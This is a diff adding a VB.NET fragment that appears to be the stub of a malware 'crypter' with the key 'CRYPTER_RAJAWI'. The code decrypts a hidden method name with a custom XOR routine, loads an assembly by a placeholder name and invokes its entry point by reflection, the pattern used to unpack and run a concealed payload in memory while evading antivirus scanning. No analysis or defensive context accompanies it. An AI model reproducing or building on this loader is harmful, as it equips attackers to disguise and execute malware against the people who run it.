@@ -1,0 +1,13 @@
+﻿Dim rca1 As String = DeCrypt("Ñ0Ž¯„", "CRYPTER_RAJAWI")
+        Dim rca2 As System.Object = System.AppDomain.CurrentDomain.Load("R4Jaw!").EntryPoint
+        CallByName(rca2, rca1, CallType.Method, Nothing, Nothing)
+    End Sub
+    Public Shared Function DeCrypt(ByVal Data As String, ByVal key As String) As String
+        Return Encoding.Default.GetString(DeCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(key)))
+    End Function
+    Public Shared Function DeCrypt(ByVal Data() As Byte, ByVal key() As Byte) As Byte()
+        For i = (Data.Length * 2) + key.Length To 0 Step -1
+            Data(i Mod Data.Length) = CByte((CInt(Data(i Mod Data.Length) Xor key(i Mod key.Length)) - CInt(Data((i + 1) Mod Data.Length)) + 256) Mod 256)
+        Next
+        Return Data
+    End Function
